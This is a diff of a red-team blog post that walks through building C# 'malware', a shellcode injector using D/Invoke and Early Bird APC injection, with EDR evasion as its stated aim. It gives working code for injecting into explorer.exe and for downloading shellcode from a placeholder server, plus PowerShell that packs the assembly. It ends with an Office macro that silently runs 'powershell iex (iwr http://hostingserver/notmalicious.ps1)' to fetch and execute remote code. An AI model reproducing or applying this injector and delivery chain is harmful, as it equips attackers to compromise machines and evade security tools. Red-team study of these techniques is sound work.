@@ -16,12 +16,12 @@ tags:
 ## Introduction
 In this blog post, I will be talking about writing your own injector in C#. Part 1 will mainly cover the use of D/Invoke and Early Bird process injection technique. In future posts, let's improve our malware with PPID (Parent Process ID) Spoofing, protect our malware from EDRs with blockdlls, ACG (Arbitrary Code Guard), invoking system calls instead of API call, and more.
 
-I won't be drilling deep into each and everything mentioned, but some basic knowledge in programming, Windows internals and Windows API should help you understanding the content much better.
+I won't be drilling deep into each and everything mentioned, but some basic knowledge in programming, Windows internals and Windows API should help you understand the content much better.
 
 ## P/Invoke
-On a high level, [P/Invoke](https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke) - Platform Invoke is a .NET mechanism, or technology that allows .NET applications to make calls and access the Windows APIs (via the `System` and `System.Runtime.InteropServices` namespaces). Combining with the ability to load and execute .NET assemblies (exe, dll) from memory thanks to the magic of Reflection, this is great for Red Teamers/TAs to carry out post-exploitation tradecrafts without touching the disk. Here is an example of P/Invoke usage to call the `OpenProcess` Win32API:
+On a high level, [P/Invoke](https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke) - Platform Invoke is a .NET mechanism, or technology that allows .NET applications to make calls and access the Windows APIs (via the `System` and `System.Runtime.InteropServices` namespaces). Combine with the ability to load and execute .NET assemblies (exe, dll) from memory thanks to the magic of Reflection, this is great for Red Teamers/TAs to carry out post-exploitation tradecrafts without touching the disk. Here is an example of P/Invoke usage to call the `OpenProcess` Win32API:
 
-```C#
+```csharp
 # 'Define' the OpenProcess API from kernel32.dll
 [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
 static extern IntPtr OpenProcess(
@@ -37,7 +37,7 @@ Okay neat, we can import and call any API we want, so what's the downside?
 2. API hooking (specific API calls monitored by AV/EDR) also busts suspicious API calls, we would need to avoid the usage of the more "obvious" APIs. D/Invoke provides Manual Mapping as a solution to bypass API hooking, but it won't be covered in this post.
 
 ## D/Invoke
-[D/Invoke](https://github.com/TheWover/DInvoke) - Dynamic Invoke was introduced in 2020 as a replacement for P/Invoke. Basically, D/Invoke grants .NET assemblies to dynamically invoking unmanaged APIs:
+[D/Invoke](https://github.com/TheWover/DInvoke) - Dynamic Invoke was introduced in 2020 as a replacement for P/Invoke. Basically, D/Invoke grants .NET assemblies to dynamically invoke unmanaged APIs:
 - Load a DLL into memory
 - Get a pointer to a function/API in that DLL
 - Call desired API using the pointer while passing in parameters
@@ -46,15 +46,15 @@ This is the standard usage of D/Invoke and will avoid directly importing the API
 To do this, D/Invoke works with [Delegates](https://learn.microsoft.com/en-us/dotnet/csharp/programming-guide/delegates/). I'm probably not the best at explaining Delegates since this is my first time doing development in C#, but in my understanding, `Delegates` allows wrapping functions within a class, API calls can now be declared as a class and be used later on. Here is an example of D/Invoke usage to call the `VirtualAllocEx` Win32API:
 
 Creating Delegate for `VirtualAllocEx`:
-```C#
+```csharp
 	public class DELEGATES {
 		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
 		public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
   }
 ```
 
-Call this Delegate:
-```C#
+To call this Delegate:
+```csharp
 pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
 DELEGATES.VirtualAllocEx virAllocEx = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.VirtualAllocEx)) as DELEGATES.VirtualAllocEx;
 IntPtr allocret = virAllocEx(procInfo.hProcess, IntPtr.Zero, (uint)sheocode.Length, 0x1000 | 0x2000, 0x40); //MEM_COMMIT | MEM_RESERVE
@@ -73,7 +73,7 @@ Project Injection is a commonly used technique to inject our shellcode into legi
 4. Execute our shellcode as a new thread with `CreateRemoteThread`
 
 Here is a PoC to inject shellcode into `explorer.exe`
-```C#
+```csharp
 // Get pid of explorer.exe
 Process[] explorerProcess = Process.GetProcessesByName("explorer");
 
@@ -96,7 +96,7 @@ WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
 IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
 ```
 
-This injection method works, however, it has a lot of flaws and can be easily picked up. The most obvious red flag  is the `PAGE_EXECUTE_READWRITE (RWX)` with `VirtualAllocEx`, as most memory region in the process has **RX** protection, allocating memory for our shellcode with Read, Write and Execute (RWX) will make it more than obvious to AV/EDR.
+This injection method works, however, it has a lot of flaws and can be easily picked up. The most obvious red flag  is the `PAGE_EXECUTE_READWRITE (RWX)` with `VirtualAllocEx`, as most memory regions in the process has **RX** protection, allocating memory for our shellcode with Read, Write and Execute (RWX) will make it more than obvious to AV/EDR.
 {{< image src="/images/explorer_11888.png" alt="Meterpreter shellcode injected into explorer.exe" position="center" style="border-radius: 8px;" >}}
 *Meterpreter shellcode was injected successfully into explorer.exe*
 
@@ -107,7 +107,7 @@ This injection could also be detected by this [Get-InjectedThread](https://gist.
 {{< image src="/images/injection_caught.png" alt="Injection detected" position="center" style="border-radius: 8px;" >}}
 *Injection detected*
 
-Additionally, `CreateRemoteThread` API is heavily scrutinized by AV/EDR as this commonly seen in injection techniques to create a thread that runs in a remote process's virtual memory space.
+Additionally, `CreateRemoteThread` API is heavily scrutinized by AV/EDR as this is commonly seen in injection techniques to create a thread that runs in a remote process's virtual memory space.
 
 ## Early Bird Process Injection with D/Invoke
 Let's improve our injection method with a technique called Early Bird (circa 2018), a variant of APC Queue Injection.
@@ -120,7 +120,7 @@ On a high level:
 5. Resume thread to start the shellcode execution
 
 Let's implement this injection using D/Invoke.
-First of all, as mentioned above, I won't be importing the whole D/Invoke project but only taking neccessary functions, structs and enums from [D/Invoke GitHub](https://github.com/TheWover/DInvoke/blob/dev/DInvoke/DInvoke/DynamicInvoke).
+First of all, as mentioned above, I won't be importing the whole D/Invoke project but only taking necessary functions, structs and enums from [D/Invoke GitHub](https://github.com/TheWover/DInvoke/blob/dev/DInvoke/DInvoke/DynamicInvoke).
 At the time of writing, the list of functions from D/Invoke source code that I have are:
 - `DynamicAPIInvoke`: Invoke an arbitrary function from a DLL dynamically, providing its name, function prototype, and arguments.
 - `DynamicFunctionInvoke`: Invoke an arbitrary function from a pointer, called by `DynamicAPIInvoke`.
@@ -130,7 +130,7 @@ At the time of writing, the list of functions from D/Invoke source code that I h
 - `GetExportAddress`: Resolves the address of a function by manually walking the module export table, given a module base address.
 We also need to define `RtlInitUnicodeString` and `LdrLoadDll` from `ntdll.dll`, also referenced on [D/Invoke GitHub](https://github.com/TheWover/DInvoke/blob/dev/DInvoke/DInvoke/DynamicInvoke/Native.cs) (LdrLoadDll is an undocumented ntdll native API)
 
-Structs and Enums:
+Structs and Enums to include:
 - `NTSTATUS`: [Undocumented Enum](https://dinvoke.net/en/ntdll/NTSTATUS)
 - `UNICODE_STRING`: [Documented Struct](https://learn.microsoft.com/en-us/windows/win32/api/subauth/ns-subauth-unicode_string)
 - `PROCESS_INFORMATION`: [Documented Struct](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information)
@@ -141,7 +141,7 @@ Structs and Enums:
 Once all this Ctrl+C and Ctrl+V is done, we can start creating Delegates for the APIs, following the documentations for these APIs from Microsoft.
 
 Creating delegate for [CreateProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
-```C#
+```csharp
 public class DELEGATES {
 
 		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
@@ -153,43 +153,43 @@ public class DELEGATES {
 }
 ```
 Creating delegate for [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
-```C#
+```csharp
 [UnmanagedFunctionPointer(CallingConvention.StdCall)]
 public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 ```
 
 Creating delegate for [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
-```C#
+```csharp
 [UnmanagedFunctionPointer(CallingConvention.StdCall)]
 public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
 ```
 
 Creating delegate for [VirtualProtectEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex)
-```C#
+```csharp
 [UnmanagedFunctionPointer(CallingConvention.StdCall)]
 public delegate bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
 ```
 
 Creating delegate for [QueueUserAPC](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex)
-```C#
+```csharp
 [UnmanagedFunctionPointer(CallingConvention.StdCall)]
 public delegate IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
 ```
 
 Creating delegate for [ResumeThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread)
-```C#
+```csharp
 [UnmanagedFunctionPointer(CallingConvention.StdCall)]
 public delegate uint ResumeThread(IntPtr hThhread);
 ```
 
 Creating delegate for `LdrLoadDll` (This is an undocumented native API, go to http://undocumented.ntinternals.net/ and search for LdrLoadDll)
-```C#
+```csharp
 [UnmanagedFunctionPointer(CallingConvention.StdCall)]
 public delegate UInt32 LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref STRUCTS.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle);
 ```
 
 Creating delegate for [RtlInitUnicodeString](https://www.pinvoke.net/default.aspx/ntdll/RtlInitUnicodeString.html)
-```C#
+```csharp
 [UnmanagedFunctionPointer(CallingConvention.StdCall)]
 public delegate void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);
 ```
@@ -197,7 +197,7 @@ public delegate void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING Destination
 We can now start invoking the APIs through the delegates in our Main() function.
 We can either store our (encrypted)shellcode on within the assembly or download it from a remote server.
 To download the shellcode from a remote server, we need the `System.Net.Http` namespace, and create a `HttpClient`:
-```C# 
+```csharp 
 byte[] shellcode;
 using (var recv = new HttpClient()) {
   shellcode = recv.GetByteArrayAsync("https://x.x.x.x/shellcode.bin").GetAwaiter().GetResult();
@@ -205,13 +205,13 @@ using (var recv = new HttpClient()) {
 ``` 
 
 `startInfo` and `procInfo` store process information such as process handle and thread handle:
-```C#
+```csharp
 STRUCTS.STARTUPINFO startInfo = new STRUCTS.STARTUPINFO();
 STRUCTS.PROCESS_INFORMATION procInfo = new STRUCTS.PROCESS_INFORMATION();
 ```
 
 Invoke Create Process through its delegate:
-```C#
+```csharp
 IntPtr pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "CreateProcessA");
 DELEGATES.CreateProcess createProc = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.CreateProcess)) as DELEGATES.CreateProcess;
 // Spawn new process in suspended state
@@ -220,35 +220,35 @@ IntPtr.Zero, null, ref startInfo, out procInfo);
 ```
 
 Invoke VirtualAllocEx through its delegate:
-```C#
+```csharp
 pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
 DELEGATES.VirtualAllocEx virAllEx = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.VirtualAllocEx)) as DELEGATES.VirtualAllocEx;
 IntPtr allocret = virAllEx(procInfo.hProcess, IntPtr.Zero, (uint)sheocode.Length, 0x1000 | 0x2000, 0x04); //MEM_COMMIT | MEM_RESERVE; 0x04: RW
 ```
 
 Invoke WriteProcessMemory through its delegate:
-```C#
+```csharp
 pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
 DELEGATES.WriteProcessMemory writeProcMem = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.WriteProcessMemory)) as DELEGATES.WriteProcessMemory;
 writeProcMem(procInfo.hProcess, allocret, sheocode, (uint)sheocode.Length, out UIntPtr bytesWritten);
 ```
 
 Invoke VirtualProtectEx through its delegate:
-```C#
+```csharp
 pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
 DELEGATES.VirtualProtectEx virProtEx = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.VirtualProtectEx)) as DELEGATES.VirtualProtectEx;
 virProtEx(procInfo.hProcess, allocret, sheocode.Length, 0x20, out oldProtect); // 0x20: RX
 ```
 
 Invoke QueueUserAPC through its delegate:
-```C#
+```csharp
 pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "QueueUserAPC");
 DELEGATES.QueueUserAPC qUsrAPC = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.QueueUserAPC)) as DELEGATES.QueueUserAPC;
 qUsrAPC(allocret, procInfo.hThread, IntPtr.Zero);
 ```
 
 Invoke ResumeThread through its delegate:
-```C#
+```csharp
 pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "ResumeThread");
 DELEGATES.ResumeThread resThrd = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.ResumeThread)) as DELEGATES.ResumeThread;
 resThrd(procInfo.hThread);
@@ -256,7 +256,7 @@ resThrd(procInfo.hThread);
 
 Build our .NET assembly as a x64 executable.
 For the sake of the demo, we can cheat a bit. In order to load our assembly in the target's memory, let's gzip compress and then base64 encode the assembly's byte stream, output it to `compressedEncodedBytes.txt`.
-```Powershell
+```powershell
 $bytes = [System.IO.File]::ReadAllBytes("$(pwd)\injection.exe")
 [System.IO.MemoryStream] $outStream = New-Object System.IO.MemoryStream
 $gzipStream = New-Object System.IO.Compression.GzipStream($outStream, [System.IO.Compression.CompressionMode]::Compress)
@@ -269,7 +269,7 @@ $b64Zipped | Out-File -NoNewLine -Encoding ASCII .\compressedEncodedBytes.txt'
 ```
 
 Create a PowerShell script to decode this compressed and encoded bytestream.
-```PowerShell
+```powershell
 $a = New-Object System.IO.MemoryStream(, [System.Convert]::FromBase64String("compressed and encoded bytestream here"))
 $b = New-Object System.IO.Compression.GZipStream($a, [System.IO.Compression.CompressionMode]::Decompress)
 $c = New-Object System.IO.MemoryStream;
@@ -291,7 +291,7 @@ $k
 ```
 
 Get this PowerShell script to be loaded and executed via an Office macro, something like:
-```Visual Basic
+```vbnet
 Dim str As String
     walk = "powershell iex (iwr http://hostingserver/notmalicious.ps1 -Useb)"
     CreateObject("Wscript.Shell").Run walk, 0
